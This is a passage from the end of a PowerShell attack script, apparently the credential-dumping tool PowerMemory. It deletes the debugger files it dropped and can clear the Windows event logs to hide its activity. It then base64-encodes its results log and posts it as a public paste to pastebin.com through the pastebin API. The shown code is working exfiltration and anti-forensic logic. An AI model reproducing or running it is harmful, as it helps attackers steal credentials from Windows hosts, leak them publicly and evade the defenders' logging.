    		    $files = "$windowsSecurity\SymbolCheck.dll","$windowsSecurity\cdb.exe","$windowsSecurity\dbghelp.dll","$windowsSecurity\symsrv.dll","$windowsSecurity\dbgeng.dll"
    		    
		    if(Test-Path $winXpPath) {
    			    Remove-Item -Recurse $winXpPath
		    }
	    }
	    
    }
Remove-Item $files

#End-Log -streamWriter $global:streamWriter

#$global:returnObjectRWMC = New-Object PSObject -Property $global:streamWriter

#return $global:streamWriter # $logPathName

if($clearEventLog -eq 1) {
     Clear-Activities $scriptPath
}

if($ExFiltrate -ne "not") {           
    Write-Progress -Activity "Exfiltrate" -status "Running..." -id 1 
    $dataToExfiltrate = Get-Content $logPathName
    $utfEncodedBytes  = [System.Text.Encoding]::UTF8.GetBytes($dataToExfiltrate)
    $pasteValue = [System.Convert]::ToBase64String($utfEncodedBytes)
    $pasteName = "PowerMemory (Follow the White Rabbit)"    
    $url = "https://pastebin.com/api/api_post.php"
    $parameters = "&api_option=paste&api_dev_key=$ExFiltrate&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
    Post-HttpRequest $url $parameters
}

Write-Output "`n`nThat's all folks, have fun!`n================================================================================================`n"

